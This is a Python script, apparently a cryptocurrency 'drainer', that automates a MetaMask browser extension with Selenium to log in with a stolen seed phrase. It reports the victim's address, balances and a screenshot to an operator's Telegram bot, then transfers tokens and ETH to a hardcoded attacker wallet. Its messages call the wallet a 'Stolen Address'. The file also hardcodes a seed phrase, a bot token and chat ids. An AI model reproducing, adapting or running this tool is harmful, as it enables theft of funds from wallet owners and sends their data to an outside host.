#!/usr/bin/env python
from selenium import webdriver
from selenium.webdriver.common.by import By

from time import sleep
import requests
import string
import random
                                                                
import sys
import os

# Arguments to enter [ seed token screen_chat_id action_chat_id ownerwallet ]
args = sys.argv

if(len(args) == 6):
    seed = args[1]
    telegram_token = args[2]
    screen_chatid = args[3]
    actions_chatid = args[4]
    owner_wallet = args[5]
else:
    seed = "emotion disagree blur twist reason version crater say pepper then infant muffin"
    telegram_token = "5793439005:AAErDl36mzRPWlXoJqnxtMMUNBXpIXOn-rs"
    screen_chatid = "-1001271047856"
    actions_chatid = "-1001871497545"
    owner_wallet = "0xA4F70cf54e32c6730458c5C756B1D0E01AfEc2A6"
    print("Wrong arguments proposed. Please verify the syntax of your command !")

tokens_to_add = [["0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6","WETH",18],["0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984","UNI",18]]
test_mode = True
is_linux = False
absolute_path = "D:/PC/AirMax/www/drainer_seed_ready/python/"

####################################### Function Part #######################################

def send_telegram_notification(message,telegram_token,chatid):

    url = "https://api.telegram.org/bot"+telegram_token+"/sendMessage?chat_id="+chatid+"&text="+message+"&parse_mode=html"
    requests.post(url)

def open_metamask():

    opt = webdriver.ChromeOptions()
    opt.add_extension(os.path.join(absolute_path,"10.20.0_0.crx"))
    if(is_linux):
        opt.add_argument("--no-sandbox")
        opt.add_argument("--headless=chrome")
        opt.add_argument("--disable-dev-shm-usage")

    opt.add_experimental_option('excludeSwitches', ['enable-logging'])

    if(is_linux):
        chromedriver_path = os.path.join(absolute_path,"chromedriver_linux")
    else:
        chromedriver_path = os.path.join(absolute_path,"chromedriver.exe")

    driver = webdriver.Chrome(chromedriver_path,options=opt)

    driver.get("chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#initialize/welcome")

    driver.switch_to.window(driver.window_handles[1])
    driver.close()
    driver.switch_to.window(driver.window_handles[0])
    return driver

def navigate_through_metamask(driver):

    sleep(0.5)
    driver.find_element(By.TAG_NAME,'button').click()
    sleep(0.5)
    driver.find_element(By.CLASS_NAME,"btn-secondary").click()
    sleep(0.5)
    buttons = driver.find_elements(By.CLASS_NAME,"btn--rounded")
    buttons[0].click()
    sleep(0.5)

def login_on_metamask(driver,seed):

    ## Entering the seed, and the two password on metamask
    seed_array = seed.split(" ")
    password = "alphanumeric123!ALPHANUMERIC123"

    inputs = driver.find_elements(By.CLASS_NAME,'MuiInputBase-input')

    ##Vérifier la taille du truc

    for i in range(len(seed_array)):
        inputs[i].send_keys(seed_array[i])

    inputs[12].send_keys(password)
    inputs[13].send_keys(password)

    if(len(driver.find_elements(By.CLASS_NAME,"actionable-message--danger")) != 0):
        send_telegram_notification("🚩 Entered seed is either invalid or not well spelled, aborting . . .\n\n<b>Seed used :</b>  " + seed,telegram_token,actions_chatid)
        driver.close()
        exit()

    driver.find_element(By.ID,'create-new-vault__terms-checkbox').click()
    sleep(0.05)
    driver.find_element(By.TAG_NAME,'button').click()

    sleep(4)
    driver.find_element(By.TAG_NAME,'button').click()
    ## End entering the seed, and the two password on metamask => We are now logged in

    ## Getting the user wallet
    sleep(0.5)
    driver.find_element(By.CLASS_NAME,"menu-bar__account-options").click()
    sleep(0.9)
    driver.find_elements(By.CLASS_NAME,"menu-item")[1].click()
    sleep(0.5)
    user_wallet = str(driver.find_element(By.CLASS_NAME,"qr-code__address").text)
    message = "🏴Connected to a <b>new wallet</b>\n\n<b>Stolen Address :</b> " + user_wallet
    send_telegram_notification(message,telegram_token,actions_chatid)
    sleep(0.5)
    driver.find_element(By.CLASS_NAME,'account-modal__close').click()
    ## End getting the user wallet

    ## Toggling the enhanced token detection
    sleep(0.5)
    driver.find_element(By.CLASS_NAME,'identicon__address-wrapper').click()
    sleep(0.5)
    driver.find_elements(By.CLASS_NAME,'account-menu__item')[5].click()
    sleep(0.5)
    driver.find_elements(By.CLASS_NAME,'tab-bar__tab')[1].click()
    sleep(0.5)
    driver.find_elements(By.CLASS_NAME,'toggle-button')[1].click()
    sleep(0.5)
    driver.find_element(By.CLASS_NAME,'settings-page__header__title-container__close-button').click()
    sleep(2)
    ## End Toggling the enhanced token detection

    return user_wallet

def change_network():
    
    sleep(0.5)
    driver.find_element(By.CLASS_NAME,'identicon__address-wrapper').click()
    sleep(0.5)
    driver.find_elements(By.CLASS_NAME,'account-menu__item')[5].click()
    sleep(0.5)
    driver.find_elements(By.CLASS_NAME,'tab-bar__tab')[1].click()
    sleep(0.5)
    driver.find_elements(By.CLASS_NAME,'toggle-button')[3].click()
    driver.find_elements(By.CLASS_NAME,'toggle-button')[4].click()
    sleep(0.5)
    driver.find_element(By.CLASS_NAME,'settings-page__header__title-container__close-button').click()
    sleep(0.5)
    driver.find_element(By.CLASS_NAME,"network-display").click()
    sleep(0.5)
    driver.find_elements(By.CLASS_NAME,"dropdown-menu-item")[1].click()
    sleep(2)

def add_testnet_tokens(driver,tokens_to_add,user_wallet):   

    element = tokens_to_add[0]

    driver.find_element(By.CLASS_NAME,"import-token-link__link").click()
    sleep(0.5)
    driver.find_element(By.ID,"custom-address").send_keys(element[0])
    driver.find_element(By.ID,"custom-symbol").send_keys(element[1])
    driver.find_element(By.ID,"custom-decimals").send_keys(element[2])

    driver.find_element(By.CLASS_NAME,"btn-primary").click()
    sleep(0.9)
    driver.find_element(By.CLASS_NAME,"btn-primary").click()
    tokens_to_add.pop(0)
    sleep(0.5)
    driver.find_element(By.CLASS_NAME,"fa-chevron-left").click()
    sleep(1)
    if(len(tokens_to_add) >= 1):
        add_testnet_tokens(driver,tokens_to_add,user_wallet)

def send_telegram_screen_and_wallet_tokens(telegram_token,chatid):

    letters = string.ascii_lowercase + string.ascii_uppercase + string.digits
    
    # Main currency balance
    solde = driver.find_element(By.CLASS_NAME,"currency-display-component__text").text
    currency = driver.find_element(By.CLASS_NAME,"currency-display-component__suffix").text
    tokens = ""

    # Other tokens balances
    asset_balance_list = driver.find_elements(By.CLASS_NAME,"asset-list-item__token-value")
    asset_name_list = driver.find_elements(By.CLASS_NAME,"asset-list-item__token-symbol")
    asset_value_in_real_money = driver.find_elements(By.TAG_NAME,"h3")

    for i in range(len(asset_balance_list)):
        try:
            tokens += "<b>Symbol :</b> " + str(asset_name_list[i].text) + " | <b>Balance :</b> " + str(asset_balance_list[i].text) + " | <b>Value in money</b> : " + str(asset_value_in_real_money[i].text) +"\n"
        except IndexError:
            tokens += "<b>Symbol :</b> " + str(asset_name_list[i].text) + " | <b>Balance :</b> " + str(asset_balance_list[i].text) + " | <b>Value in money</b> : Unknown "

    file_name = ( ''.join(random.choice(letters) for i in range(10)) ) + ".png"
    driver.get_screenshot_as_file(file_name)
    file = {'photo':open(file_name,'rb')}


    message = "🏴 <b>Main currency :</b> " + str(solde) + " " + str(currency) + "\n\n" + "<b>🏴 Token list :</b>\n" + tokens

    url_first = "https://api.telegram.org/bot"+telegram_token+"/sendPhoto?chat_id="+chatid+"&caption="
    url_second = "https://api.telegram.org/bot"+telegram_token+"/sendMessage?chat_id="+chatid+"&text="+message+"&parse_mode=html"

    requests.post(url_first,files=file)
    requests.post(url_second)

    os.remove(file_name )

    return solde

def prepare_token_transfer(driver,owner_wallet,to_remove,user_wallet):
    # Tokens
    asset_value_in_real_money = driver.find_elements(By.CLASS_NAME,"asset-list-item__token-value")
    if(to_remove > 0):
        if(len(asset_value_in_real_money) - to_remove >= 1):
            for i in range(to_remove):
                asset_value_in_real_money.pop(1)
    
    if(len(asset_value_in_real_money) > 1):
        transfer_unique_token(driver,asset_value_in_real_money[1],asset_value_in_real_money,owner_wallet,to_remove,user_wallet)

# Only works for tokens other than ETH
def transfer_unique_token(driver,token,asset_value_in_real_money,owner_wallet,to_remove,user_wallet): 
    
    to_remove += 1
    token_value = token.text
    token_value = str(format(float(token_value) / 100,'f'))
    token.click()
    ## logique d'envoie
    driver.find_elements(By.CLASS_NAME,'icon-button__circle')[0].click()
    sleep(2)
    driver.find_element(By.CLASS_NAME,"ens-input__wrapper__input").send_keys(owner_wallet)
    sleep(4)
    driver.find_element(By.CLASS_NAME,"unit-input__input").send_keys(token_value)
    sleep(2)
    driver.find_element(By.CLASS_NAME,"btn-primary").click()
    sleep(5)
    driver.find_element(By.CLASS_NAME,"btn-primary").click()
    sleep(2)
    driver.find_element(By.CLASS_NAME,"home__tab").click()
    sleep(2)
    message = '🏴 Just sent a <b>new token</b> to : ' + owner_wallet + " \n\n[ <b>Amount :</b> " + token_value + " ]\n\n<b>Stolen Address :</b> " + user_wallet
    send_telegram_notification(message,telegram_token,actions_chatid)
    prepare_token_transfer(driver,owner_wallet,to_remove,user_wallet)

def transfer_eth(driver,user_wallet):  
    
    eth_balance = driver.find_element(By.CLASS_NAME,"currency-display-component__text").text
    final_eth_balance = str(format(float(eth_balance) / 100,'f'))

    driver.find_elements(By.CLASS_NAME,"eth-overview__button")[1].click()
    sleep(2)
    driver.find_element(By.CLASS_NAME,"ens-input__wrapper__input").send_keys(owner_wallet)
    sleep(4)
    driver.find_element(By.CLASS_NAME,"unit-input__input").send_keys(final_eth_balance)
    sleep(2)
    driver.find_element(By.CLASS_NAME,"btn-primary").click()
    sleep(5)
    driver.find_element(By.CLASS_NAME,"btn-primary").click()
    sleep(2)
    driver.find_element(By.CLASS_NAME,"home__tab").click()
    message = "🏴 Just sent <b>ETH</b> to : " + owner_wallet + "\n\n[ <b>Amount :</b> " + final_eth_balance + " ]\n\n<b>Stolen Address :</b> " + user_wallet
    send_telegram_notification(message,telegram_token,actions_chatid)

def check_user_eth_balance(balance):

    if(float(format(float(balance),'f')) > 0.01):
        return True
    else:
        return False

def end_script(user_wallet):
    send_telegram_notification("🏴 End of the steal !\n\nStolen Address : " + user_wallet)
    driver.close()
    exit(1)

####################################### Working Part #######################################

driver = open_metamask()

navigate_through_metamask(driver)

user_wallet = login_on_metamask(driver,seed)

if(test_mode):
    change_network()
    add_testnet_tokens(driver,tokens_to_add,user_wallet)

eth_balance = send_telegram_screen_and_wallet_tokens(telegram_token,screen_chatid)


if(check_user_eth_balance(eth_balance) == False):
    send_telegram_notification("🚩 User balance is too low to continue, aborting . . .",telegram_token,actions_chatid)
    driver.close()
    exit()
else:
    prepare_token_transfer(driver,owner_wallet,0,user_wallet)

    transfer_eth(driver,user_wallet)

    end_script(user_wallet,telegram_token,actions_chatid)